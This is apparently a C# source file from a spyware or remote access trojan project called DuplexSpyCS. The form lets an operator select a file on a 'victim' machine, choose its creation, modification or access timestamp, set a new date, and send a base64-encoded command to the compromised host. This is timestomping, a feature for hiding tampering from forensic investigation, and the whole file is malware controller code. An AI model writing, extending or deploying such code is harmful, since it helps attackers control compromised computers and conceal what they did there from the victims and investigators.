using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFileDatetime : Form
    {
        private clsVictim v;
        private string m_szCurrentPath;
        private string m_szFilename;
        private bool m_bIsFile;

        private enum FileTimestampType
        {
            CreationTime,
            LastModifiedTime,
            LastAccessedTime,
        }

        public frmFileDatetime(clsVictim v, string szCurrentPath, string szFilename, bool bFile)
        {
            InitializeComponent();

            this.v = v;
            m_szCurrentPath = szCurrentPath;
            m_szFilename = szFilename;
            m_bIsFile = bFile;
        }

        private void fnSetup()
        {
            textBox1.ReadOnly = true;
            textBox1.Text = m_szFilename;

            comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;

            foreach (string szName in Enum.GetNames(typeof(FileTimestampType)))
                comboBox1.Items.Add(szName);

            if (comboBox1.Items.Count > 0)
                comboBox1.SelectedIndex = 0;

            Text = "EntityTimestamp";
        }

        private void frmFileDatetime_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            int nType = (int)(FileTimestampType)Enum.Parse(typeof(FileTimestampType), comboBox1.Text);
            string szIsFile = m_bIsFile ? "1" : "0";
            string szDatetme = dateTimePicker1.Value.ToString("F");
            string szFilePath = Path.Combine(m_szCurrentPath, m_szFilename);

            Task.Run(() =>
            {
                v.SendCommand($"File|ts|{szIsFile}|{clsCrypto.b64E2Str(szFilePath)}|{nType}|{clsCrypto.b64E2Str(szDatetme)}");
            });
        }
    }
}
